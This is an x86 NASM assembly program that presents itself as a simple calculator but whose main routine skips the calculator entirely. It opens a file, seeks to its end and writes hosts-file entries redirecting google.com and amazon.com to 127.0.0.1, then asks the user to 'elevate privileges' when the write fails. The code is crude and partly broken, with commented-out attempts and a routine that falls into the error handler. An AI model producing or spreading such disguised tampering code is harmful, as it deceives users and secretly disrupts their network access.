%include "linux-ex/asm_io.inc"
%include "linux-ex/file_io.inc"
segment .data
welcome_string db "Welcome to the calculator of PAIN", 0
input_string db "Please insert a number. ", 0
selection_string db "Please choose an operation. 0:add, 1:substract, 2:multiply, 3:divide ", 0
error_msg db "Please choose a new operation. ", 0
output_string db "The output of the operation is ", 0
remainder_string db "with a remainder of ", 0
file_path db "testFile", 0
write_string db 13,"127.0.0.1 www.google.com", 13, "127.0.0.1 google.com", 13, "127.0.0.1 www.amazon.com", 13, "127.0.0.1 amazon.com", 13, 0
error_file db "Error occurred! Please elevate privileges!", 0

segment .bss
input1 resd 1
input2 resd 1
operation resb 1
result resd 1
remainder resd 1
fileId resb 1
info resb 32

segment .text
        global  _asm_main, randgen
_asm_main:
        enter   0,0               ; setup routine
        pusha

        mov eax, file_path      ;file to open
        call open_file
        cmp eax, 0
        JL file_error           ;skip write if error
        mov [fileId], eax       ;save file descriptor

        ;mov eax, write_string   ;msg to write
        ;mov ebx, [fileId]       ;file descriptor
        ;call write_to_file

        ;mov eax, info
        ;mov ebx, [fileId]
        ;call read_file

        ;mov eax, info
        ;call print_string

        ;add byte info, [write_string]   ;msg to write
        ;add eax, 7
        ;mov [info], eax
        ;mov byte [info], write_string

        mov ebx, [fileId]
        call seek_file

        mov eax, write_string
        mov ebx, [fileId]       ;file descriptor
        call write_to_file
        call print_nl
        call print_nl
        JMP end
start:
        mov byte [remainder], 0
        mov eax, welcome_string
        call print_string
        call print_nl
        mov eax, input_string
        call print_string
        
        call read_int
        mov [input1], eax

        mov eax, selection_string
        call print_string
        
        call read_int,
        mov [operation], eax

        mov eax, input_string
        call print_string

        call read_int
        mov [input2], eax

getOperand:
        mov eax, [operation]
        cmp eax, 0
        JE add
        cmp eax, 1
        JE substract
        cmp eax, 2
        JE multiply
        cmp eax, 3
        JE divide
        JMP nullOperand

add:
        mov eax, [input1]
        add eax, [input2]
        mov [result], eax
        JMP print

substract:
        mov eax, [input1]
        sub eax, [input2]
        mov [result], eax
        JMP print

multiply:
        mov eax, [input1]
        mov ebx, [input2]
        imul ebx
        mov [result], eax
        JMP print

divide:
        mov eax, [input1]
        mov ebx, [input2]
        mov edx, 0
        idiv ebx
        mov [result], eax
        mov [remainder], edx
        dump_regs 1
        JMP print

updateHost:
        call print_nl

nullOperand:
        mov eax, error_msg
        call print_string

        call read_int
        mov [operation], eax

        call print_nl
        JMP getOperand
print:
        mov eax, output_string
        call print_string
        mov eax, [result]
        call print_int
        mov eax, [remainder]
        cmp eax, 0
        JG end
        mov eax, remainder_string
        call print_string
        mov eax, [remainder]
        call print_int

end:
        call print_nl
        popa
        mov     eax, 0            ; return back to C
        leave                     
        ret

randgen:
    mov  ax, dx
    xor  dx, dx
    mov  cx, 100    
    div  cx       ; here dx contains the remainder of the division - from 0 to 9

    add  dl, '0'  ; to ascii from '0' to '9'
    call print_int

file_error:
        mov eax, error_file
        call print_string
        JMP end